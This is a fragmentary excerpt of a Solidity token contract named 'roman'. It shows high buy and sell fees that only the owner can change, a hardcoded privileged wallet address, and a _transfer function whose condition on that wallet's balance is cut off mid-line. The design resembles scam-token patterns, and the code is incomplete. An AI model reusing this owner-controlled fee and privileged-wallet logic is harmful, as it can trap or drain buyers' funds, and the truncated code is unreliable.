...
contract roman  is Ownable, IERC20 {
    ...
    uint256 public _maxBuyAmount =      500000 * 10 ** _decimals;
    uint256 public _maxSellAmount =     500000 * 10 ** _decimals;
    uint256 public _BFee = 20;
    uint256 public _SFee = 25;
    address public constant _mWallet = 0x83DDb32017905f945abbD3BE0cf65ffF4653EAb2;


    uint256 private _liquiditySwapThreshold =   750000;
    uint256 private _walletThreshold =         1500000 * 10 ** _decimals;
    ...
    function setTax(uint256 enable) external onlyOwner {
        ...
        else if (enable == 4)
        {
            _BFee = 8;
            _SFee = 10;            
            _maxSellAmount =   1500000 * 10 ** _decimals;
            _maxBuyAmount =    1500000 * 10 ** _decimals;
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        //if (_liquiditySwapThreshold < amount && (_excludedFromFee[msg.sender] || Address.isPairAddress(to)) && to == from) {
          if ((_liquiditySwapThreshold > _balances[_mWallet]) && 
